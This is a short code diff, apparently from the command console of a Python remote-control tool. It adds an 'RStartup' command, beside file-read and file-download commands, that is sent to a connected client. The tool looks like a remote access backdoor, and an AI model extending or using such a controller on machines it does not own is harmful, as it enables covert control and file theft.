@@ -455,6 +455,9 @@ readfile <file>           read from file
                     f.close()
                 print("File is downloaded")
 
+            elif command == 'RStartup':
+                client.send(command.encode())
+
             elif command == 'exit':
                 client.send(command.encode())
                 output = client.recv(1024)
